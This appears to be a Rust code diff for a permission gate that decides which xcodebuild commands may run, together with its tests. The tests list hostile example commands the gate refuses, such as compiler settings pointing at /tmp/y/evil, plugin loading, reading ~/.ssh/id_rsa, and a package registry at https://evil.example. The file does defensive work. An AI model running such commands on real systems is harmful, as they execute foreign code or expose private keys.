@@ -365,101 +365,136 @@ fn textutil_mode(tokens: &[Token]) -> bool {
     false
 }
 
-/// `xcodebuild` takes actions and `KEY=VALUE` build settings as bare words. A setting that names
-/// the compiler, the linker, or the install root runs or writes wherever that value says, and
-/// `install` / `installsrc` write the product to `$DSTROOT`. Other settings and the ordinary
-/// build actions are left to the command's own flag gate.
-///
-/// A valued flag's argument is skipped, so a scheme or target named `install` is not an action.
+/// The valued flags of `commands/xcode/xcodebuild.toml`. A value is never an action or a setting,
+/// so a scheme or target named `install` is not an action.
+const XCODEBUILD_VALUED: &[&str] = &[
+    "-arch",
+    "-authenticationKeyID",
+    "-authenticationKeyIssuerID",
+    "-authenticationKeyPath",
+    "-clonedSourcePackagesDirPath",
+    "-archivePath",
+    "-buildVersion",
+    "-configuration",
+    "-defaultLanguage",
+    "-defaultPackageRegistryURL",
+    "-derivedDataPath",
+    "-destination",
+    "-destination-timeout",
+    "-exportFormat",
+    "-exportLanguage",
+    "-exportOptionsPlist",
+    "-exportPath",
+    "-find-executable",
+    "-find-library",
+    "-importComponent",
+    "-importPath",
+    "-jobs",
+    "-localizationPath",
+    "-maximum-concurrent-test-device-destinations",
+    "-maximum-concurrent-test-simulator-destinations",
+    "-maximum-parallel-testing-workers",
+    "-only-testing",
+    "-only-testing:TEST-IDENTIFIER",
+    "-onlyTesting",
+    "-packageAuthorizationProvider",
+    "-packageCachePath",
+    "-packageDependencySCMToRegistryTransformation",
+    "-packageFingerprintPolicy",
+    "-packageSigningEntityPolicy",
+    "-parallel-testing-enabled",
+    "-parallel-testing-worker-count",
+    "-prepareDeviceSupport",
+    "-project",
+    "-resultBundlePath",
+    "-resultBundleVersion",
+    "-resultStreamPath",
+    "-runDestination",
+    "-runDestinationTimeout",
+    "-scheme",
+    "-scmProvider",
+    "-sdk",
+    "-skip-testing",
+    "-skip-testing:TEST-IDENTIFIER",
+    "-skipTesting",
+    "-target",
+    "-test-enumeration-format",
+    "-test-enumeration-output-path",
+    "-test-enumeration-style",
+    "-test-iterations",
+    "-test-repetition-relaunch-enabled",
+    "-test-timeouts-enabled",
+    "-testLanguage",
+    "-testPlan",
+    "-testProductsPath",
+    "-testRegion",
+    "-toolchain",
+    "-workspace",
+    "-xcconfig",
+    "-xctestrun",
+];
+
+/// `xcodebuild` takes actions and `KEY=VALUE` build settings as bare words. Every bare word is
+/// judged by its shape: a setting that names a tool runs it, `install` / `installsrc` write the
+/// product to `$DSTROOT`, and a word that reaches outside the project points the build at files
+/// nobody has seen. A default package registry is a remote whose packages the build runs.
 fn xcodebuild_settings(tokens: &[Token]) -> bool {
-    // The valued flags from the command definition. A value is never an action or a setting.
-    const VALUED: &[&str] = &[
-        "-arch",
-        "-archivePath",
-        "-buildVersion",
-        "-configuration",
-        "-defaultLanguage",
-        "-defaultPackageRegistryURL",
-        "-derivedDataPath",
-        "-destination",
-        "-destination-timeout",
-        "-exportArchive",
-        "-exportFormat",
-        "-exportLanguage",
-        "-exportLocalizations",
-        "-exportNotarizedApp",
-        "-exportOptionsPlist",
-        "-exportPath",
-        "-find-executable",
-        "-find-library",
-        "-importComponent",
-        "-importLocalizations",
-        "-importPath",
-        "-jobs",
-        "-localizationPath",
-        "-maximum-concurrent-test-device-destinations",
-        "-maximum-concurrent-test-simulator-destinations",
-        "-maximum-parallel-testing-workers",
-        "-only-testing",
-        "-only-testing:TEST-IDENTIFIER",
-        "-onlyTesting",
-        "-packageAuthorizationProvider",
-        "-packageCachePath",
-        "-packageDependencySCMToRegistryTransformation",
-        "-packageFingerprintPolicy",
-        "-packageSigningEntityPolicy",
-        "-parallel-testing-enabled",
-        "-parallel-testing-worker-count",
-        "-prepareDeviceSupport",
-        "-project",
-        "-resultBundlePath",
-        "-resultBundleVersion",
-        "-resultStreamPath",
-        "-retry-tests-on-failure",
-        "-runDestination",
-        "-runDestinationTimeout",
-        "-scheme",
-        "-scmProvider",
-        "-sdk",
-        "-skip-testing",
-        "-skip-testing:TEST-IDENTIFIER",
-        "-skipTesting",
-        "-target",
-        "-test-enumeration-format",
-        "-test-enumeration-output-path",
-        "-test-enumeration-style",
-        "-test-iterations",
-        "-test-repetition-relaunch-enabled",
-        "-test-timeouts-enabled",
-        "-testLanguage",
-        "-testPlan",
-        "-testProductsPath",
-        "-testRegion",
-        "-toolchain",
-        "-workspace",
-        "-xcconfig",
-        "-xctestrun",
-    ];
     let mut i = 1;
     while i < tokens.len() {
         let t = tokens[i].as_str();
         if t == "--" {
-            return tokens[i + 1..].iter().any(|token| names_a_compiler_or_install(token.as_str()));
+            return tokens[i + 1..].iter().any(|token| xcodebuild_word_refused(token.as_str()));
         }
-        if let Some(glued) = valued_assignment(t, VALUED) {
+        if t.strip_prefix("-defaultPackageRegistryURL")
+            .is_some_and(|rest| rest.is_empty() || rest.starts_with('='))
+        {
+            return true;
+        }
+        if let Some(glued) = valued_assignment(t, XCODEBUILD_VALUED) {
             i += if glued { 1 } else { 2 };
             continue;
         }
         if t.starts_with('-') && t != "-" {
+            if t.split_once('=').is_some_and(|(_, value)| leaves_the_project(value)) {
+                return true;
+            }
             i += 1;
             continue;
         }
-        if names_a_compiler_or_install(t) {
+        if xcodebuild_word_refused(t) {
             return true;
         }
         i += 1;
     }
     false
+}
+
+fn xcodebuild_word_refused(word: &str) -> bool {
+    matches!(word, "install" | "installsrc") || setting_key(word).is_some_and(names_a_tool_or_install_root) || leaves_the_project(word)
+}
+
+/// The key of a `KEY=VALUE` or `KEY[cond=…]…=VALUE` build setting.
+fn setting_key(word: &str) -> Option<&str> {
+    let end = word.find(|c: char| !(c.is_ascii_alphanumeric() || c == '_')).unwrap_or(word.len());
+    let key = &word[..end];
+    if key.is_empty() || key.starts_with(|c: char| c.is_ascii_digit()) {
+        return None;
+    }
+    let mut rest = &word[end..];
+    while let Some(inner) = rest.strip_prefix('[') {
+        rest = &inner[inner.find(']')? + 1..];
+    }
+    rest.starts_with('=').then_some(key)
+}
+
+fn names_a_tool_or_install_root(key: &str) -> bool {
+    matches!(key, "CC" | "CXX" | "CPLUSPLUS" | "LD" | "LDPLUSPLUS" | "LIBTOOL" | "DSTROOT") || key.ends_with("_EXEC")
+}
+
+/// A path, a home or variable reference, or a parent step: the build would reach outside the
+/// project through it, and its target is not known from the text.
+fn leaves_the_project(text: &str) -> bool {
+    text.contains(['/', '~', '$', '`']) || text.contains("..")
 }
 
 /// `Some(true)` when `token` is `flag=value`; `Some(false)` when it is a valued flag whose
@@ -468,11 +503,6 @@ fn valued_assignment(token: &str, valued: &[&str]) -> Option<bool> {
     valued.iter().find_map(|flag| {
         if token == *flag { Some(false) } else { token.strip_prefix(flag).filter(|rest| rest.starts_with('=')).map(|_| true) }
     })
-}
-
-fn names_a_compiler_or_install(token: &str) -> bool {
-    matches!(token, "install" | "installsrc")
-        || token.split_once('=').is_some_and(|(key, _)| matches!(key, "CC" | "LD" | "SWIFT_EXEC" | "DSTROOT"))
 }
 
 #[cfg(test)]
@@ -510,6 +540,112 @@ mod tests {
             "xcodebuild build CODE_SIGNING_ALLOWED=NO",
         ] {
             assert!(allows(command), "{command}");
+        }
+    }
+
+    /// A setting is judged by its shape, wherever it sits. A tool key runs that tool, and a value
+    /// that leaves the project (a path, `~`, `$`, `..`) points the build at foreign files.
+    #[test]
+    fn a_build_setting_is_judged_by_its_shape_wherever_it_sits() {
+        for command in [
+            "xcodebuild build CPLUSPLUS=/tmp/y/evil",
+            "xcodebuild build LDPLUSPLUS=/tmp/y/evil",
+            "xcodebuild build LIBTOOL=/tmp/y/evil",
+            "xcodebuild build CXX=evil",
+            "xcodebuild build CC=clang-evil",
+            "xcodebuild build SWIFT_FRONTEND_EXEC=evil",
+            "xcodebuild build OTHER_CFLAGS=-fplugin=/tmp/y/x.dylib",
+            "xcodebuild build OTHER_SWIFT_FLAGS=-load-plugin-executable=/tmp/y/evil",
+            "xcodebuild build SYMROOT=/etc/x",
+            "xcodebuild build CONFIGURATION_BUILD_DIR=/tmp/y",
+            "xcodebuild build OBJROOT=/tmp/y",
+            "xcodebuild build SDKROOT=/tmp/y/evil.sdk",
+            "xcodebuild build 'SYMROOT=$(HOME)/x'",
+            "xcodebuild build SYMROOT=~",
+            "xcodebuild build SYMROOT=..",
+            "xcodebuild build 'OTHER_CFLAGS[sdk=macosx*]=-fplugin=/tmp/y/x.dylib'",
+            "xcodebuild -exportArchive CC=/tmp/y/evil build",
+            "xcodebuild -exportLocalizations CC=/tmp/y/evil build",
+            "xcodebuild -importLocalizations DSTROOT=/etc build",
+            "xcodebuild -exportNotarizedApp CC=/tmp/y/evil build",
+            "xcodebuild -retry-tests-on-failure CC=/tmp/y/evil test",
+            "xcodebuild build -- CC=/tmp/y/evil",
+            "xcodebuild -someNewFlag /tmp/y build",
+            "xcodebuild -someNewFlag=/tmp/y build",
+        ] {
+            assert!(!allows(command), "{command}");
+        }
+        for command in [
+            "xcodebuild build ONLY_ACTIVE_ARCH=YES",
+            "xcodebuild build OTHER_LDFLAGS=-ObjC",
+            "xcodebuild build 'GCC_PREPROCESSOR_DEFINITIONS=DEBUG=1 FOO'",
+            "xcodebuild build 'ARCHS[sdk=iphonesimulator*]=arm64'",
+            "xcodebuild build TOOLCHAINS=swift",
+            "xcodebuild -exportArchive -archivePath build/Foo.xcarchive -exportPath build/out -exportOptionsPlist Export.plist",
+            "xcodebuild -scheme Foo test -only-testing FooTests/testBar",
+            "xcodebuild -scheme Foo test -retry-tests-on-failure -test-iterations 3",
+        ] {
+            assert!(allows(command), "{command}");
+        }
+    }
+
+    /// Each path a flag names is gated by what the build does with it. A derived-data, package or
+    /// test-products folder holds code the build runs, so it takes the executor gate.
+    #[test]
+    fn every_path_flag_is_gated_by_what_the_build_does_with_it() {
+        for command in [
+            "xcodebuild -resultStreamPath /etc/x build",
+            "xcodebuild -testProductsPath /etc/x build-for-testing",
+            "xcodebuild -testProductsPath /tmp/y/x.xctestproducts test-without-building",
+            "xcodebuild -test-enumeration-output-path /etc/x test",
+            "xcodebuild -exportLocalizations -localizationPath /etc/x",
+            "xcodebuild -importPath ~/.ssh/id_rsa -importComponent x",
+            "xcodebuild -packageCachePath /tmp/y build",
+            "xcodebuild -clonedSourcePackagesDirPath /tmp/y build",
+            "xcodebuild -derivedDataPath /tmp/y build",
+            "xcodebuild -sdk /tmp/y/evil.sdk build",
+            "xcodebuild -defaultPackageRegistryURL https://evil.example build",
+            "xcodebuild -defaultPackageRegistryURL evil.example build",
+            "xcodebuild -defaultPackageRegistryURL=https://evil.example build",
+            "xcodebuild -authenticationKeyPath ~/.ssh/id_rsa -allowProvisioningUpdates build",
+        ] {
+            assert!(!allows(command), "{command}");
+        }
+        for command in [
+            "xcodebuild -resultStreamPath build/stream.json build",
+            "xcodebuild -derivedDataPath build/DerivedData build",
+            "xcodebuild -clonedSourcePackagesDirPath build/SourcePackages build",
+            "xcodebuild -sdk iphonesimulator build",
+            "xcodebuild -exportLocalizations -localizationPath build/loc -exportLanguage de",
+            "xcodebuild -testProductsPath build/Foo.xctestproducts test-without-building",
+        ] {
+            assert!(allows(command), "{command}");
+        }
+    }
+
+    /// The handler skips the same valued flags the command definition declares, so a value is
+    /// never read as a setting and a boolean flag never swallows the setting after it.
+    #[test]
+    fn the_handler_skips_exactly_the_declared_valued_flags() {
+        let text = std::fs::read_to_string(concat!(env!("CARGO_MANIFEST_DIR"), "/commands/xcode/xcodebuild.toml")).expect("toml file");
+        let doc: toml::Value = text.parse().expect("toml");
+        let command = &doc["command"][0];
+        let list = |key: &str| -> Vec<String> {
+            let mut names: Vec<String> = command[key]
+                .as_array()
+                .expect("a flag list")
+                .iter()
+                .map(|v| v.as_str().expect("flag").to_string())
+                .collect();
+            names.sort();
+            names
+        };
+        let mut handler: Vec<String> = super::XCODEBUILD_VALUED.iter().map(|s| (*s).to_string()).collect();
+        handler.sort();
+        assert_eq!(handler, list("valued"));
+        for boolean in ["-exportArchive", "-exportLocalizations", "-importLocalizations", "-exportNotarizedApp", "-retry-tests-on-failure"]
+        {
+            assert!(list("standalone").iter().any(|f| f == boolean), "{boolean} is not standalone");
         }
     }
 }
